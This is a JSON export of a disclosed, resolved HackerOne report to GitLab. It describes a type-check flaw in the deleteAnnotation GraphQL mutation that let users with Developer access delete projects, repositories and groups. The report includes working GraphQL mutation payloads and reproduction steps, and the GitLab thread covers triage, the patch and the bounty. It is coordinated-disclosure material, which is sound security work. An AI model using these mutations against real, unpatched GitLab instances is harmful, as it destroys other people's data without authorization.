{"id":960244,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NjAyNDQ=","url":"https://hackerone.com/reports/960244","title":"Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ...","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-08-17T07:28:36.164Z","submitted_at":"2020-08-17T07:28:36.178Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ledz1996","url":"/ledz1996","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-02T16:12:02.665Z","bug_reporter_agreed_on_going_public_at":"2020-11-02T16:12:02.592Z","team_member_agreed_on_going_public_at":"2020-11-02T15:37:14.455Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nSimilar bug to #858671, but this time with annotations mutation: `DeleteAnnotation`\n\nin ***app/graphql/mutations/metrics/dashboard/annotations/base.rb***\n\n```ruby\nmodule Mutations\n  module Metrics\n    module Dashboard\n      module Annotations\n        class Base \u003c BaseMutation\n          private\n\n          # This method is defined here in order to be used by `authorized_find!` in the subclasses.\n          def find_object(id:)\n            GitlabSchema.object_from_id(id)\n          end\n        end\n      end\n    end\n  end\nend\n\n```\n\nThere is no type check for `find_object` in ***app/graphql/mutations/metrics/dashboard/annotations/delete.rb***\n```ruby\n    annotation = authorized_find!(id: id)\n\n            result = ::Metrics::Dashboard::Annotations::DeleteService.new(context[:current_user], annotation).execute\n```\n\nAnd luckily, Developer is sufficient for the permission check \n\n***app/services/metrics/dashboard/annotations/delete_service.rb***\n```ruby\nAbility.allowed?(user, :delete_metrics_dashboard_annotation, annotation)\n```\n\n### Steps to reproduce\n\n1. For User A, Create project A Private adding User B as Developer\n2. For User B, execute the following mutation in `http://gitlab.example.vm/-/graphql-explorer`\n\n```graphql\nmutation {\n  deleteAnnotation(input: {id: \"gid://Gitlab/Project/\u003cproject-id\u003e\"}) {\n    clientMutationId\n  }\n}\n```\n3. Project disappear along with Repository\n\n███████\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:     \nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.6p146\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.9\nGit Version:    2.27.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.2.3-ee\nRevision:   640e2695514\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.7\nURL:        http://gitlab.example.vm\nHTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers: \n\nGitLab Shell\nVersion:    13.3.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nUnauthorized deleting of repository/project by maintainers, developers","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":66,"name":"Type Confusion"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":15,"voters":["sky003","ali","akashhamal0x01","hakivvi","m0ti0nl3ss_","therorschah","sherixxx","d4nnyph4n70m","object","s0va55ah","and 5 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":39022,"asset_type":"OTHER","asset_identifier":"Your Own GitLab Instance","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8953459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also I believe this is not scoped only to Project but also Group, Issue, etc..\n\n```ruby\nirb(main):012:0\u003e Ability.allowed?(User.find(2), :delete_metrics_dashboard_annotation, Group.find(7))\n=\u003e true\n```","automated_response":false,"created_at":"2020-08-17T07:40:47.840Z","updated_at":"2020-08-17T07:40:47.840Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8953461,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-08-17T07:40:58.863Z","updated_at":"2020-08-17T07:40:58.863Z","additional_data":{"old_title":"Insufficient Type Check leading to Developer ability to delete Project, Repository","new_title":"Insufficient Type Check leading to Developer ability to delete Project, Repository, Group"},"actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8953462,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-08-17T07:41:03.413Z","updated_at":"2020-08-17T07:41:03.413Z","additional_data":{"old_title":"Insufficient Type Check leading to Developer ability to delete Project, Repository, Group","new_title":"Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ..."},"actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8953765,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ledz1996,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2020-08-17T08:19:28.467Z","updated_at":"2020-08-17T08:19:28.467Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8969881,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To use it on group simple replace Project with Group in the graphql, Make sure you have developer permission.\n```graphql\nmutation {\n  deleteAnnotation(input: {id: \"gid://Gitlab/Group/\u003cgroup-id\u003e\"}) {\n    clientMutationId\n  }\n}\n```","automated_response":false,"created_at":"2020-08-18T15:18:31.829Z","updated_at":"2020-08-18T15:18:31.829Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8979120,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi folks, is there any difficulties in verifying this issue?","automated_response":false,"created_at":"2020-08-19T15:07:00.452Z","updated_at":"2020-08-19T15:07:00.452Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8981083,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ledz1996,\n\nThank you for your report, we'll be validating it shortly. Following #858671 a few issues were opened and there are already some fixes that are ready but not deployed yet, we have to cross check if this issue hasn't already been discovered. You'll receive updates soon.\n\nThank you for your patience,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2020-08-19T17:22:45.415Z","updated_at":"2020-08-19T17:22:45.415Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8999636,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dcouture, thank you for the response, please let me know if you need any technical information on the issue ;). Thank for your work.","automated_response":false,"created_at":"2020-08-21T11:13:22.271Z","updated_at":"2020-08-21T11:13:22.271Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9002692,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-08-21T15:05:14.569Z","updated_at":"2020-08-21T15:05:14.569Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":825146},"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9002723,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-08-21T15:08:05.317Z","updated_at":"2020-08-21T15:08:05.317Z","additional_data":{"added_weaknesses":[{"id":66,"name":"Type Confusion"}],"removed_weaknesses":[]},"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9002954,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @ledz1996,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/239348.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2020-08-21T15:30:15.060Z","updated_at":"2020-08-21T15:30:15.060Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9002963,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Initial $1000 on triage.","automated_response":false,"created_at":"2020-08-21T15:30:57.914Z","updated_at":"2020-08-21T15:30:57.914Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ledz1996","url":"/ledz1996"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9071494,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @ledz1996,\n\nThe issue you reported is currently scheduled to be fixed by 2020-10-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2020-08-29T04:19:55.304Z","updated_at":"2020-08-29T04:19:55.304Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9434910,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @ledz1996,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.4.2 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2020-10-06T14:48:03.255Z","updated_at":"2020-10-06T14:48:03.255Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ledz1996","url":"/ledz1996"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9434958,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-10-06T14:51:04.558Z","updated_at":"2020-10-06T14:51:04.558Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"4000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ledz1996","url":"/ledz1996"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9703784,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-02T15:37:14.492Z","updated_at":"2020-11-02T15:37:14.492Z","first_to_agree":true,"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9704265,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-02T16:12:02.628Z","updated_at":"2020-11-02T16:12:02.628Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9704266,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-02T16:12:02.703Z","updated_at":"2020-11-02T16:12:02.703Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9704282,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"oh wait, could you please remove the video?","automated_response":false,"created_at":"2020-11-02T16:14:35.377Z","updated_at":"2020-11-02T16:14:35.377Z","actor":{"username":"ledz1996","cleared":true,"url":"/ledz1996","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9704320,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure thing, it's removed now and also in the GitLab issue.\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2020-11-02T16:17:44.531Z","updated_at":"2020-11-02T16:20:24.104Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}